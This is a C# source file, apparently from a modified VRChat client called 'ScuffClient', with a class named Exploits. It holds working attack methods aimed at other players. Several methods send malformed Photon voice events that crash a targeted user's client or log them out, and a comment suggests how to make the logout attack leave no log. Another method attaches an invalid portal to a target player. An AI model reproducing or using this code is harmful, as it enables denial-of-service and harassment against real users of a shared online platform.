using System;
using VRC;
using ScuffClient.Photon;
using ExitGames.Client.Photon;
using UnityEngine;
using VRCSDK2;
using Player = VRC.Player;
using EventType = ScuffClient.Photon.EventType;

namespace ScuffClient.Misc
{
    public class Exploits
    {
        public static void TriggerIndexOutOfRange(Player p)
        {
            //byte array of 0 will trigger index out of range for targetted player
            byte[] data = new byte[0];
            RaiseEventOptions options = new RaiseEventOptions()
            {
                TargetActors = new int[] { Functions.GetPhotonId(p) }
            };

            PhotonSend.RaiseEvent(EventType.SendVoice, data, options, default(SendOptions));
        }

        //4 BOTS REQUIRED (ALT. 4 PLAYERS)
        public static void LogoutTarget(Player p)
        {
            /* mess with index 5,6 and 7 for server time 
             * can make it logless by making resulting num less than 2k
             * but me lazy
             */
            byte[] data = new byte[1950];

            RaiseEventOptions options = new RaiseEventOptions()
            {
                TargetActors = new int[] { Functions.GetPhotonId(p) }
            };
            PhotonSend.RaiseEvent(EventType.SendVoice, data, options, default(SendOptions));
        }

        public static void DropPortal(Player target)
        {
            Transform t = target.transform;

            GameObject portal = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", target.transform.position, target.transform.rotation);
            Networking.RPC(VRC_EventHandler.VrcTargetType.AllBufferOne, portal, "ConfigurePortal", new object[]
            {
                "wrld_5b89c79e-c340-4510-be1b-476e9fcdedcc",
                "~hidden",
                -666
            });
            //ty azami for giving me this
            portal.transform.parent = target.transform;
        }

        public static void TriggerWorldObjectEvent(VRC_EventHandler.VrcEvent ev)
        {

        }
    }
}
